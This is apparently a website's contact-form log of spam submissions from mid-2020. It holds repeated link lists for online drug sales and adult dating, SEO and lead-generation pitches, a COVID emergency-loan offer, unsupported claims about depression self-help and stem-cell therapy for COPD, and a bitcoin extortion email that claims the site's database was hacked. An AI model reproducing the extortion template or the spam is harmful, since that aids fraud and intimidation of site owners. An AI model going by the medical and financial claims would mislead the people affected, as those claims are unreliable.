Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to TALK with them - literally while they’re still on the web looking at your site.

CLICK HERE http://www.talkwithwebvisitor.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works and even give it a try… it could be huge for your business.

Plus, now that you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation pronto… which is so powerful, because connecting with someone within the first 5 minutes is 100 times more effective than waiting 30 minutes or more later.

The new text messaging feature lets you follow up regularly with new offers, content links, even just follow up notes to build a relationship.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable.
 
CLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business, potentially converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=esyray.com
+++ 2020-06-22 12:11:08 AM -- Email from: Eric Jones, -- subject: Why not TALK with your leads?, -- email: eric@talkwithwebvisitor.com, -- Message is: My name’s Eric and I just found your site esyray.com.

It’s got a lot going for it, but here’s an idea to make it even MORE effective.

Talk With Web Visitor – CLICK HERE http://www.talkwithwebvisitor.com for a live demo now.

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It signals you the moment they let you know they’re interested – so that you can talk to that lead while they’re literally looking over your site.

And once you’ve captured their phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation… and if they don’t take you up on your offer then, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

CLICK HERE http://www.talkwithwebvisitor.com to discover what Talk With Web Visitor can do for your business.

The difference between contacting someone within 5 minutes versus a half-hour means you could be converting up to 100X more leads today!

Eric
PS: Studies show that 70% of a site’s visitors disappear and are gone forever after just a moment. Don’t keep losing them. 
Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://www.talkwithwebvisitor.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitor.com/unsubscribe.aspx?d=esyray.com
+++ 2020-06-22 10:25:57 AM -- Email from: Adult оnlinе dating whаtsaрp numbers: https://1borsa.com/adultdatingsex528744, -- subject: Adult bеst freе dating sitеs canаda 2019: https://1borsa.com/datingsexygirls909310, -- email: cilcavombergar@yahoo.com.ar, -- Message is: Dаting site fоr sex with girls from Frаnсе: http://www.linkbrdesk.net/url/ksfe 
Adult dating sitеs аrоund еаst londоn: https://ecuadortenisclub.com/sexdatinggirls836771 
Dаting fоr seх with еxрeriencеd girls from 30 уеars: https://mupt.de/amz/sexdatinggirls36122 
Аdult dating someonе 35 уеаrs older: https://slimex365.com/adultdatingsex376994 
Adult оnlinе dating by the numbеrs: https://ecuadortenisclub.com/adultdatingsex702289
+++ 2020-06-23 07:41:28 AM -- Email from: Yonskels, -- subject: jvxxrncl, -- email: billykranz@probbox.com, -- Message is: &lt;a href=&quot;https://prednisonesale.com/&quot;&gt;can i buy prednisone online&lt;/a&gt; &lt;a href=&quot;https://azithromycin.us.com/&quot;&gt;azithromycin buy online&lt;/a&gt; &lt;a href=&quot;https://bupropionx.com/&quot;&gt;150 mg bupropion&lt;/a&gt; &lt;a href=&quot;https://isotretinoin24.com/&quot;&gt;isotretinoin&lt;/a&gt; &lt;a href=&quot;https://propeciagen.com/&quot;&gt;propecia&lt;/a&gt;
+++ 2020-06-23 01:16:17 PM -- Email from: Booskels, -- subject: nefupazy, -- email: shellie@outlook.com, -- Message is: &lt;a href=&quot;http://flomaxmed.com/&quot;&gt;flomax 0.4 mg&lt;/a&gt; &lt;a href=&quot;http://sildenafiltb.com/&quot;&gt;sildenafil 100mg&lt;/a&gt; &lt;a href=&quot;http://paxilmed.com/&quot;&gt;buy paxil&lt;/a&gt; &lt;a href=&quot;http://buypropecia247.us.org/&quot;&gt;buy propecia in canada&lt;/a&gt; &lt;a href=&quot;http://azithromycin.us.com/&quot;&gt;azithromycin 500 mg pills&lt;/a&gt; &lt;a href=&quot;http://lxapro.com/&quot;&gt;lexapro medication&lt;/a&gt; &lt;a href=&quot;http://priligy365.com/&quot;&gt;cost of priligy in singapore&lt;/a&gt;
+++ 2020-06-23 07:06:20 PM -- Email from: Wimskels, -- subject: ipwdlgin, -- email: wrcain@yahoo.com, -- Message is: &lt;a href=&quot;http://colchicinetab.com/&quot;&gt;generic colchicine&lt;/a&gt;
+++ 2020-06-23 08:07:39 PM -- Email from: Zakskels, -- subject: eslgmler, -- email: hermansiu808@probbox.com, -- Message is: &lt;a href=&quot;https://tretinoin365.com/&quot;&gt;where to get tretinoin gel&lt;/a&gt; &lt;a href=&quot;https://sildenafiltb.com/&quot;&gt;sildenafil 100mg online india&lt;/a&gt;
+++ 2020-06-23 09:51:56 PM -- Email from: Sex dating оnlinе with рhоtо. Is free: http://www.linkbrdesk.net/url/kqoj, -- subject: Sеху girls for the night in уour town AU: http://youwa.lk/?url=HL1Ym, -- email: lamthuy1998@yahoo.com.vn, -- Message is: Dating site fоr sеx with girls from Austrаlia: http://gmy.su/:LqEmb 
Dating sitе for sex with girls in yоur citу: https://qspark.me/h6ACiZ 
Аdult dating аmеriсаn оnlinе: https://darknesstr.com/datingsexygirls670754 
Adult #1 frеe dаting арр: https://coupemoi.la/D3jKN 
Dating site for sеx with girls frоm Frаnce: https://vrl.ir/adultdatingsex179151
+++ 2020-06-23 11:11:49 PM -- Email from: Zakskels, -- subject: rpmdrtag, -- email: cookie4u1117@probbox.com, -- Message is: &lt;a href=&quot;https://cipro.us.org/&quot;&gt;cipro 590 mg&lt;/a&gt; &lt;a href=&quot;https://priligy365.com/&quot;&gt;priligy online uk&lt;/a&gt; &lt;a href=&quot;https://propeciagen.com/&quot;&gt;propecia 1mg generic&lt;/a&gt; &lt;a href=&quot;https://prednisonesale.com/&quot;&gt;prednisone 2.5 mg price&lt;/a&gt; &lt;a href=&quot;https://sildenafil4you.us.org/&quot;&gt;buy sildenafil&lt;/a&gt; &lt;a href=&quot;https://tadallafil.com/&quot;&gt;cheap tadalafil 5mg&lt;/a&gt;
+++ 2020-06-24 12:16:54 AM -- Email from: Rick Hendrick, -- subject: , -- email: rick.hendrick@gmail.com, -- Message is: ABOLISH REACTIVE DEPRESSION AND EMERGE FROM ITS DEEP, DARK, BLACK HOLE?
• Do you feel this came from the beginnings of a dysfunctional family system?
• Or did this come from the loss of a beloved job or loved one?
• Or did this come from dire effects from the disease of Alcoholism?
• Or did this come from the brainwashing attempts of a fearful and angry world, i.e. terroristic recruitment?
Do you know that whatever caused this DEEP, DARK, BLACK HOLE OF DEPRESSION which may have come from a NERVOUS BREAKDOWN can cease its influence over your life? Yes, you do not have to live buried in negative thinking from the defeat from negative life experiences in your life. Please know that any tragic experiences from childhood to adulthood need no longer affect your chance to gain emotional wellbeing.
Instead, now you have the opportunity to be HAPPY and in PEACEFUL CONTROL OF YOUR OWN DESTINY with only the memory of what once ailed you. Now is the time to overcome depression and begin to take control over your life. Not only that, you alone have the opportunity to reverse negative thinking and achieve your very own POSITIVE BELIEF SYSTEM.
PLEASE NOTE: Your views on spirituality or religion will not prevent you from successfully implementing your own PARENTAL SELF-LOVE PROCESS to ACHIEVE PURPOSE, MOTIVATION, GOOD SELF-ESTEEM, SUCCESS, AND MORE. Yes, like Lin Tillman did, you too can ACHIEVE MORE THAN YOU ASKED FOR and make meaningful and healthy contributions to this planet.
You can learn more about Lin’s journey in her book The Invisible Girl &amp; GOD, where she shares her TRUE STORY of how she healed herself from an agonizing depression with suicidal ideations.
GO TO: https://bit.ly/Depression-self-help to learn more
+++ 2020-06-24 08:59:25 AM -- Email from: Teoskels, -- subject: gvklirsq, -- email: codylacy@probbox.com, -- Message is: &lt;a href=&quot;https://lxapro.com/&quot;&gt;lexapro coupon&lt;/a&gt;
+++ 2020-06-24 06:25:00 PM -- Email from: Adult best 100 frее cаnadiаn dating sitеs: http://freeurlredirect.com/adultdatingsex804606, -- subject: The bеst girls for sex in уour tоwn USA: https://onlineuniversalwork.com/datingsexygirls387355, -- email: nigel_on_tour@hotmail.co.uk, -- Message is: Sехy girls for the night in yоur town USА: http://www.linkbrdesk.net/url/mejh 
Bеautiful girls fоr sеx in уour сitу: https://links.wtf/djxF 
Thе bеst girls for seх in уour town USA: https://slimex365.com/datingsexygirls230919 
Seхy girls for thе night in уour town AU: http://freeurlredirect.com/datingsexygirls158360 
Вeаutiful girls for sеx in уоur сity АU: http://fund.school/adultdatingsex379291
+++ 2020-06-24 11:36:14 PM -- Email from: Maria Amiet, -- subject: Your non ugc backlinks quote request, -- email: mike@arteseo.co, -- Message is: Here is your quotation regarding the non-ugc backlinks to fix the ranks for esyray.com

https://www.arteseo.co/non-ugc-seo-power/
+++ 2020-06-25 06:16:29 PM -- Email from: Ida Siebenhaar, -- subject: , -- email: siebenhaar.ida@outlook.com, -- Message is: ABOLISH REACTIVE DEPRESSION AND EMERGE FROM ITS DEEP, DARK, BLACK HOLE?
• Do you feel this came from the beginnings of a dysfunctional family system?
• Or did this come from the loss of a beloved job or loved one?
• Or did this come from dire effects from the disease of Alcoholism?
• Or did this come from the brainwashing attempts of a fearful and angry world, i.e. terroristic recruitment?
Do you know that whatever caused this DEEP, DARK, BLACK HOLE OF DEPRESSION which may have come from a NERVOUS BREAKDOWN can cease its influence over your life? Yes, you do not have to live buried in negative thinking from the defeat from negative life experiences in your life. Please know that any tragic experiences from childhood to adulthood need no longer affect your chance to gain emotional wellbeing.
Instead, now you have the opportunity to be HAPPY and in PEACEFUL CONTROL OF YOUR OWN DESTINY with only the memory of what once ailed you. Now is the time to overcome depression and begin to take control over your life. Not only that, you alone have the opportunity to reverse negative thinking and achieve your very own POSITIVE BELIEF SYSTEM.
PLEASE NOTE: Your views on spirituality or religion will not prevent you from successfully implementing your own PARENTAL SELF-LOVE PROCESS to ACHIEVE PURPOSE, MOTIVATION, GOOD SELF-ESTEEM, SUCCESS, AND MORE. Yes, like Lin Tillman did, you too can ACHIEVE MORE THAN YOU ASKED FOR and make meaningful and healthy contributions to this planet.
You can learn more about Lin’s journey in her book The Invisible Girl &amp; GOD, where she shares her TRUE STORY of how she healed herself from an agonizing depression with suicidal ideations.
GO TO: https://bit.ly/Depression-self-help to learn more
+++ 2020-06-26 09:00:08 AM -- Email from: The best womеn for sех in уour town Саnаda: http://6i9.co/2SWK, -- subject: Sеху girls for thе night in yоur town Cаnаda: https://qspark.me/17lhni, -- email: ssaofficeca20140154@gmail.com, -- Message is: Meеt seху girls in уоur city AU: http://r.artscharity.org/By58N
+++ 2020-06-26 12:37:31 PM -- Email from: Katherine Rounsevell, -- subject: , -- email: katherine.rounsevell@gmail.com, -- Message is: Hey, if you or anyone you know is hosting trivia, be sure to check out https://bit.ly/triviarat-com.  Its a free web app for accepting responses and marking!  It's great for zoom trivia or onsite -- and on that note, remember that handing out physical paper/pencils will not be on the &quot;allowed&quot; list once things start opening up.  Thanks :)
+++ 2020-06-26 03:34:44 PM -- Email from: Jen Harrell, -- subject: RE: people interested in your website, -- email: trst@bestmail.us, -- Message is: Hi,

I thought our services may be of interest. 

Your website can receive 5,000 to 12,000 targeted visitors in just one week.
These are people who are interested in seeing your site.

Targeted traffic will come to esyray.com from online publications in your sites EXACT niche.
Prices start at just $54.99 
Our service is national only - not segmented by city or state.

To learn more please go to http://traffic-stampede.online

We look forward to serving your advertising needs.

Best,
Jen 
TS
In Business Since 2015
+++ 2020-06-26 06:22:14 PM -- Email from: Yonskels, -- subject: iuwlsjjc, -- email: bernieb3rni32@probbox.com, -- Message is: &lt;a href=&quot;https://cephalexin911.com/&quot;&gt;order cephalexin 500mg&lt;/a&gt; &lt;a href=&quot;https://vardenafilxr.com/&quot;&gt;vardenafil brand name india&lt;/a&gt; &lt;a href=&quot;https://doxycyclinetabs.com/&quot;&gt;doxycycline online without prescription&lt;/a&gt;
+++ 2020-06-26 08:05:28 PM -- Email from: Elyse Porterfield, -- subject: , -- email: elyse.porterfield@msn.com, -- Message is: No charge advertising for your website here: https://bit.ly/zero-cost-ads
+++ 2020-06-27 12:13:44 AM -- Email from: Booskels, -- subject: pmcwbnhv, -- email: mart4378@hotmail.com, -- Message is: &lt;a href=&quot;http://paxilmed.com/&quot;&gt;generic paxil&lt;/a&gt; &lt;a href=&quot;http://ivermectin.us.com/&quot;&gt;ivermectin generic&lt;/a&gt; &lt;a href=&quot;http://buypropecia247.us.org/&quot;&gt;buy generic propecia uk&lt;/a&gt; &lt;a href=&quot;http://colchicinetab.com/&quot;&gt;colchicine tablets&lt;/a&gt;
+++ 2020-06-27 05:19:51 AM -- Email from: Wimskels, -- subject: adaadckj, -- email: isobel@yahoo.com, -- Message is: &lt;a href=&quot;http://buypropecia247.us.org/&quot;&gt;best place to buy propecia online&lt;/a&gt;
+++ 2020-06-27 08:58:47 PM -- Email from: RebeccaEnter, -- subject: You are my heart, -- email: yourmyheart@gmail.com, -- Message is: You are my heart: http://clickfrm.com/yY5k
+++ 2020-06-27 09:23:16 PM -- Email from: Find уourself a girl fоr thе night in yоur сity: https://cav.ac/bBu4NV, -- subject: Вeаutiful girls fоr sеx in уоur сitу Canаdа: http://fund.school/adultdatingsex606959, -- email: Yeshuafrank2@gmail.com, -- Message is: Аdult dаting sitеs in eаst lоndon eastеrn cаpе: http://www.linkbrdesk.net/url/mays
+++ 2020-06-27 10:21:11 PM -- Email from: Teoskels, -- subject: wtvxhitp, -- email: hamishrajones@probbox.com, -- Message is: &lt;a href=&quot;https://flomaxmed.com/&quot;&gt;flomax pills&lt;/a&gt;
+++ 2020-06-27 11:54:17 PM -- Email from: Maryellen Binnie, -- subject: , -- email: binnie.maryellen@gmail.com, -- Message is: Hello,

I’m David Domine, owner of Louisville Historic Tours that operates here in Old Louisville, Kentucky.  
Like many businesses, I’m sure you and your employees have probably been stuck at home because of the Kentucky-wide lockdown. Most restaurants and bars still aren’t accepting large groups. This is making get-togethers or outside team building exercises currently impossible. 

That’s why I’m reaching out today.  I run a Daytime Walking Tour and a Nighttime Ghost Tour right here in Louisville.  Since our tours are outside, we are operating fully, and we are able to take groups of people (as long as we follow the social distancing guidelines.)

I’ve had a huge increase in the amount of organizations booking private tours for their employees since everyone is looking for a way to get together.  I wanted to reach out to you about the same possibility.    

Here’s the Daytime Walking Tour:

https://bit.ly/DaytimeWalkingTour

And here’s a bit of detail on the Ghost Tour:

https://bit.ly/TheGhostTour

These are great for work outings, or just a regular date night with the family or kids.  I do offer special pricing for groups.

I also like to make the tour as memorable as I can for you.  If you have any special occasions, anniversaries, or milestones happening, drop me some details in advance and I’ll make sure to mention it on the tour.  Looking forward to hearing back! 

Kind Regards,

David Domine
https://bit.ly/LouisvilleHistoricTours-com
+++ 2020-06-28 12:40:14 PM -- Email from: Zakskels, -- subject: zpeszbkm, -- email: hermansiu808@probbox.com, -- Message is: &lt;a href=&quot;https://sildenafiltb.com/&quot;&gt;sildenafil tablets 100 mg&lt;/a&gt; &lt;a href=&quot;https://phenergan365.com/&quot;&gt;phenergan canada&lt;/a&gt; &lt;a href=&quot;https://tadallafil.com/&quot;&gt;india tadalafil&lt;/a&gt; &lt;a href=&quot;https://retina3.com/&quot;&gt;retin a pill cost&lt;/a&gt; &lt;a href=&quot;https://accutanme.com/&quot;&gt;accutane online canada&lt;/a&gt;
+++ 2020-06-28 11:18:14 PM -- Email from: Ash Mansukhani, -- subject: URGENT!, -- email: inquiries@techknowspace.com, -- Message is: Hello, 

My Name is Ash and I Run Tech Know Space https://techknowspace.com We are your Premium GO-TO Service Centre for All Logic Board &amp; Mainboard Repair

When other shops say &quot;it can't be fixed&quot; WE CAN HELP!

ALL iPHONE 8 &amp; NEWER
BACK GLASS REPAIR - 1 HOUR
 
Devices We Repair
Audio Devices Audio Device Repair

Bluetooth Speakers - Headphones - iPod Touch
Computers All Computer Repair

All Brands &amp; Models - Custom Built - PC &amp; Mac
Game Consoles Game Console Repair

PS4 - XBox One - Nintendo Switch
Laptops All Laptop Repair

All Brands &amp; Models - Acer, Asus, Compaq, Dell, HP, Lenovo, Toshiba
MacBooks All MacBook Repair

All Series &amp; Models - Air, Classic, Pro
Phones All Phone Repair

All Brands &amp; Models - BlackBerry, Huawei, iPhone, LG, OnePlus, Samsung, Sony
Smart Watches Apple Watch Repair

Apple Watch - Samsung Gear - Moto 360
Tablets All Tablet Repair

All Brands &amp; Models - iPad, Lenovo Yoga, Microsoft Surface, Samsung Tab

Drone Repair

Call us and tell us your issues today!

Toll Free: (888) 938-8893 
https://techknowspace.com

Ash Mansukhani
ash@techknowspace.com
https://twitter.com/techknowspace
https://www.linkedin.com/company/the-techknow-space
+++ 2020-06-29 09:17:38 AM -- Email from: Аdult dating amеriсаn guys оnlinе: http://xsle.net/adultdatingsex293426, -- subject: Find уоursеlf a girl for the night in yоur city USA: https://mupt.de/amz/datingsexygirls102305, -- email: chloe0015@hotmail.com, -- Message is: Аdult best dating website cаlifоrniа: https://jtbtigers.com/adultdatingsex632767
+++ 2020-06-29 10:42:23 AM -- Email from: Alison Wethering, -- subject: Important, -- email: alison@videomarketingguru.club, -- Message is: Hey, great site!

Have you thought about adding a video in response to COVID-19?

We can make one for you: 
https://www.videovideovideomarketing.club/success/?=esyray.com

Customers are worried right now. A short video like this can make a big impact for your business in the long term. People will remember it!

Be well,
Linda

P.S. Due to coronavirus, we have also lowered our prices by up to 55%. 






- This commercial message sent from PJLK Marketing LC
410 E Santa Clara Street STE 817
San Jose, CA 95113

To unsubscribe click here:
https://videovideovideomarketing.club/out.php/?site=esyray.com
+++ 2020-06-29 04:42:49 PM -- Email from: Mike Jackson, -- subject: Your SEO quote, -- email: no-replytam@gmail.com, -- Message is: Good day! 
 
As we have discussed on our website`s chat, here is the SEO pricing I was referring to 
https://googlealexarank.com/index.php/seo-packages/ 
 
And as promissed we will also include 1500 non-ugc backlinks as bonus, along with the plan. 
 
thank you 
Top SEO Expert
+++ 2020-06-29 05:05:05 PM -- Email from: Tedskels, -- subject: edceacsn, -- email: just4maha@probbox.com, -- Message is: &lt;a href=&quot;https://sildenafil4you.us.org/&quot;&gt;sildenafil citrate tablets ip 100 mg&lt;/a&gt; &lt;a href=&quot;https://vardenafilxr.com/&quot;&gt;where to buy vardenafil online&lt;/a&gt; &lt;a href=&quot;https://priligy365.com/&quot;&gt;priligy tablets over the counter&lt;/a&gt; &lt;a href=&quot;https://ivermectin.us.com/&quot;&gt;stromectol price in india&lt;/a&gt;
+++ 2020-06-30 02:46:31 AM -- Email from: Tedskels, -- subject: iymaqogr, -- email: lufflrc@probbox.com, -- Message is: &lt;a href=&quot;https://vardenafilxr.com/&quot;&gt;buy vardenafil&lt;/a&gt; &lt;a href=&quot;https://propeciagen.com/&quot;&gt;propecia&lt;/a&gt; &lt;a href=&quot;https://prednisonesale.com/&quot;&gt;prednisone 5 mg&lt;/a&gt;
+++ 2020-06-30 05:14:04 AM -- Email from: Marisol Hoke, -- subject: , -- email: marisol.hoke39@gmail.com, -- Message is: TITLE: Are YOU Building Your Own DREAMS Or Has SOMEONE ELSE Hired You To Build THEIRS? 

DESCRIPTION: Have you ever looked at sites like Google or Facebook and asked yourself…“How can they make SO MUCH MONEY when they aren’t even really selling any products?!?!”
Well, Google and Facebook are cashing in on their platforms. They’re taking advantage of the millions of people who come to their sites…Then view and click the ads on their pages.
Those sites have turned into billion dollar companies by getting paid to send traffic to businesses. 

Did You Know That More People Have Become Millionaires In The Past Year Than Ever Before? Did You Know You Can Make Money By Becoming A Traffic Affiliate?

Watch Our Video &amp; Discover The Easy 1-Step System Our Members Are Using To Get Paid Daily.

URL: https://bit.ly/retirement-biz
+++ 2020-06-30 11:25:29 AM -- Email from: Mackenzie Alderson, -- subject: Su sitio ha sido, -- email: hacker@tippgeber.bayern, -- Message is: PLEASE FORWARD THIS EMAIL TO SOMEONE IN YOUR COMPANY WHO IS ALLOWED TO MAKE IMPORTANT DECISIONS!

We have hacked your website http://www.esyray.com and extracted your databases.

How did this happen?
Our team has found a vulnerability within your site that we were able to exploit. After finding the vulnerability we were able to get your database credentials and extract your entire database and move the information to an offshore server.

What does this mean?

We will systematically go through a series of steps of totally damaging your reputation. First your database will be leaked or sold to the highest bidder which they will use with whatever their intentions are. Next if there are e-mails found they will be e-mailed that their information has been sold or leaked and your site http://www.esyray.com was at fault thusly damaging your reputation and having angry customers/associates with whatever angry customers/associates do. Lastly any links that you have indexed in the search engines will be de-indexed based off of blackhat techniques that we used in the past to de-index our targets.

How do I stop this?

We are willing to refrain from destroying your site's reputation for a small fee. The current fee is .33 BTC in bitcoins ($3000 USD). 

Send the bitcoin to the following Bitcoin address (Copy and paste as it is case sensitive):

12WghuRH7b8K7mcJvxCzWQjW7RVEAC7qgx

Once you have paid we will automatically get informed that it was your payment. Please note that you have to make payment within 5 days after receiving this notice or the database leak, e-mails dispatched, and de-index of your site WILL start!

How do I get Bitcoins?

You can easily buy bitcoins via several websites or even offline from a Bitcoin-ATM. We suggest you https://cex.io/ for buying bitcoins.

What if I don’t pay?

If you decide not to pay, we will start the attack at the indicated date and uphold it until you do, there’s no counter measure to this, you will only end up wasting more money trying to find a solution. We will completely destroy your reputation amongst google and your customers.

This is not a hoax, do not reply to this email, don’t try to reason or negotiate, we will not read any replies. Once you have paid we will stop what we were doing and you will never hear from us again!

Please note that Bitcoin is anonymous and no one will find out that you have complied.
+++ 2020-06-30 11:29:53 AM -- Email from: Wimskels, -- subject: oabinitn, -- email: jenniferseverson@mail.com, -- Message is: &lt;a href=&quot;http://neurontingab.com/&quot;&gt;neurontin 800&lt;/a&gt;
+++ 2020-07-01 02:17:06 PM -- Email from: Booskels, -- subject: etkukyds, -- email: wegerud@outlook.com, -- Message is: &lt;a href=&quot;http://trazodonesale.com/&quot;&gt;buy trazodone&lt;/a&gt; &lt;a href=&quot;http://prazosin.us.com/&quot;&gt;prazosin generic&lt;/a&gt;
+++ 2020-07-01 07:15:02 PM -- Email from: Wimskels, -- subject: cjmrwvas, -- email: punisher2002gh@hotmail.com, -- Message is: &lt;a href=&quot;http://chloroquinaralen.com/&quot;&gt;chloroquine generic brand&lt;/a&gt;
+++ 2020-07-01 08:22:37 PM -- Email from: Thе best girls fоr sех in yоur town: https://ecuadortenisclub.com/datingsexygirls134820, -- subject: Аdult оnlinе dating mobilе numbers: https://mupt.de/amz/sexdatinggirls898586, -- email: melynda91@yahoo.fr, -- Message is: Аdult amеriсan dаting freе online: https://9m.no/%E7%88%B5%F0%91%83%B2
+++ 2020-07-02 09:11:19 AM -- Email from: Teoskels, -- subject: dcoksndl, -- email: joebetski@probbox.com, -- Message is: &lt;a href=&quot;https://cialisprice.us.org/&quot;&gt;cialis 20mg price&lt;/a&gt;
+++ 2020-07-02 11:34:33 AM -- Email from: Tedskels, -- subject: algcbkqk, -- email: hsolis@probbox.com, -- Message is: &lt;a href=&quot;https://motrin.us.com/&quot;&gt;canadian motrin&lt;/a&gt; &lt;a href=&quot;https://nexium.us.org/&quot;&gt;nexium tablets&lt;/a&gt; &lt;a href=&quot;https://duloxetine.us.com/&quot;&gt;cymbalta from canada price&lt;/a&gt; &lt;a href=&quot;https://prazosin.us.com/&quot;&gt;prazosin hcl&lt;/a&gt; &lt;a href=&quot;https://chloroquinaralen.com/&quot;&gt;aralen canadian pharmacy&lt;/a&gt;
+++ 2020-07-02 09:02:22 PM -- Email from: Tedskels, -- subject: jfkxcdpt, -- email: jackeline@probbox.com, -- Message is: &lt;a href=&quot;https://azithromycin.us.org/&quot;&gt;how much is azithromycin&lt;/a&gt; &lt;a href=&quot;https://motrin.us.com/&quot;&gt;where to buy motrin&lt;/a&gt; &lt;a href=&quot;https://attarax.com/&quot;&gt;atarax 50&lt;/a&gt; &lt;a href=&quot;https://amitriptyline24.com/&quot;&gt;amitriptyline pharmacy&lt;/a&gt; &lt;a href=&quot;https://proscar.us.com/&quot;&gt;proscar 5mg tabs&lt;/a&gt; &lt;a href=&quot;https://chloroquine.us.org/&quot;&gt;chloroquine&lt;/a&gt; &lt;a href=&quot;https://lipitor.us.org/&quot;&gt;buy lipitor&lt;/a&gt;
+++ 2020-07-03 05:10:32 AM -- Email from: Christen Gilyard, -- subject: How To Get Paid For What You Already know, -- email: christen.gilyard@outlook.com, -- Message is: The self education industry is a $355 Million per day industry and is expected to TRIPLE in the next 5 years! And with the right strategy this could be your opportunity to:

Get in early before it is oversaturated.
Help others go faster while you get paid
Fix a broken system
Make an impact on the world
Get paid for a skill, hobby, passion or expertise you already have (or get paid from someone else’s)

And Tony Robbins, Russell Brunson and Dean Graziosi are finally going to show YOU how to take advantage of it…

(Now if you don’t already know who these 3 guys are then you’ll want to listen up!! They’ve impacted millions of lives and have generated billions of dollars)

Look, if you’ve ever thought about (or even if you never thought about) getting paid for something you know (like a passion or a skill)... or even getting paid from what others know, then you have to attend.

This is one of the fastest growing industries online and in all areas of the world.

And for the first time ever they’re doing a webclass training on how to extract your wisdom (or somebody else’s) and get other people to pay you for it!

You can save your spot here (and when you do register, you’re immediately going to get a brand new, never before seen training from Tony and Dean. No one else will ever get a chance to see this rare training except for us).

kbbmint.com

After hearing what they’re teaching, I truly believe this is the #1 way to make a massive income, make a massive impact on the world and leave a legacy!

And here’s just a fraction of what you’ll learn this week:

The mostly hidden $129 Billion dollar market and how you can make a massive impact and leave a legacy by profiting from it.

The KBB Triangle: The 3 ways to profit (whether you’re an expert with a thriving business, just getting started, or even if you’re at complete rock bottom)

The framework to profit from what you (or someone else) already knows - or by creating community and bringing people together.

Plus you’ll even be able to ask them questions when they do Q&amp;A at the end of the training. (Chat is limited so show up early).

There’s no other time where you’re going to have this opportunity. So BE THERE! Because if you’re not going to make a shift in your life now, then when? And if not with these guys, then let me ask with who?

This is your rare chance to learn from 3 people who started from nothing and went on to generate billions of dollars and build massive companies.

Spots are filling up faster than they ever have, so you need to hurry and go here to save your spot

https://kbbmint.com

Register now and I’ll see you there this week - Plus they did a few brand new “pre-event” trainings that only those who register get access to.

Talk soon
+++ 2020-07-03 05:24:24 AM -- Email from: Lauren Gale, -- subject: Emergency Funds for Americans, -- email: lauren@quickfundingnow.xyz, -- Message is: IMPORTANT UPDATE

Many Americans now qualify for emergency loans up to $5,000.

To find out if you qualify, visit: 
https://quickfundingnow.xyz/r1/?=esyray.com

These loans are unrelated to any stimulus or unemployment compensation you may already be receiving from the government.

Due to the COVID-19 outbreak, lenders are expecting a surge in applications. We recommend submitting your loan request as promptly as possible.

Regards,
Lauren Gale
National Loan Advisor
Quick Funding Now




30025 Alicia Parkway Unit#20-93	
Laguna Niguel, CA 92677





 
Don’t want Quick Funding Now marketing:
https://quickfundingnow.xyz/out.php/?site=esyray.com
+++ 2020-07-03 06:29:18 AM -- Email from: Аdult сanadiаn freе dаting sites: https://coupemoi.la/oVpki, -- subject: Веautiful women for sex in your town Сanаda: http://ka.do/hoU, -- email: umamaheswar_rs@yahoo.com, -- Message is: Dating fоr seх with exрerienсеd girls from 30 уеаrs: http://s.amgg.net/rka8
+++ 2020-07-04 01:18:27 AM -- Email from: Yonskels, -- subject: ibfatsln, -- email: laurinda@probbox.com, -- Message is: &lt;a href=&quot;https://ivermectin.us.org/&quot;&gt;ivermectin stromectol&lt;/a&gt; &lt;a href=&quot;https://hydroxychloroquinecv.com/&quot;&gt;plaquenil tab 200mg&lt;/a&gt; &lt;a href=&quot;https://domperidone.us.com/&quot;&gt;buy motilium 10mg&lt;/a&gt;
+++ 2020-07-04 11:00:34 AM -- Email from: Wimskels, -- subject: dfirayvt, -- email: coetakahashi@yahoo.com, -- Message is: &lt;a href=&quot;http://chloroquinaralen.com/&quot;&gt;chloroquine 300&lt;/a&gt;
+++ 2020-07-04 01:34:17 PM -- Email from: Аdult zоosк 1 dаting аpp itunеs: http://xsle.net/datingsexygirls457330, -- subject: Girls for seх in yоur city | USA: https://jtbtigers.com/datingsexygirls196781, -- email: ositanaty2009@gmail.com, -- Message is: Веаutiful women for sеx in yоur town USА: https://coupemoi.la/7lVB7
+++ 2020-07-05 12:53:25 PM -- Email from: Booskels, -- subject: oqtaudaq, -- email: pitorfive@hotmail.com, -- Message is: &lt;a href=&quot;http://azithromycin.us.org/&quot;&gt;where to buy azithromycin&lt;/a&gt; &lt;a href=&quot;http://prazosin.us.com/&quot;&gt;buy prazosin&lt;/a&gt; &lt;a href=&quot;http://nexium.us.org/&quot;&gt;buy nexium&lt;/a&gt; &lt;a href=&quot;http://proscar.us.com/&quot;&gt;proscar medication&lt;/a&gt; &lt;a href=&quot;http://malegra.us.org/&quot;&gt;malegra 100 from india&lt;/a&gt; &lt;a href=&quot;http://cialisprice.us.org/&quot;&gt;cialis price&lt;/a&gt; &lt;a href=&quot;http://domperidone.us.com/&quot;&gt;motilium domperidone 10mg&lt;/a&gt;
+++ 2020-07-06 03:11:30 AM -- Email from: Liliana Lingle, -- subject: , -- email: lingle.liliana@gmail.com, -- Message is: Do you want to promote your website for free? Have a look at this: http://www.free-ad-posting.xyz
+++ 2020-07-06 06:24:38 AM -- Email from: Lilly Cleary, -- subject: , -- email: lilly.cleary@outlook.com, -- Message is: Stem cell therapy has proven itself to be one of the most effective treatments for COPD (Chronic Obstructive Pulmonary Disorder). IMC is the leader in stem cell therapies in Mexico. For more information on how we can treat COPD please visit:
https://bit.ly/copd-integramedicalcenter
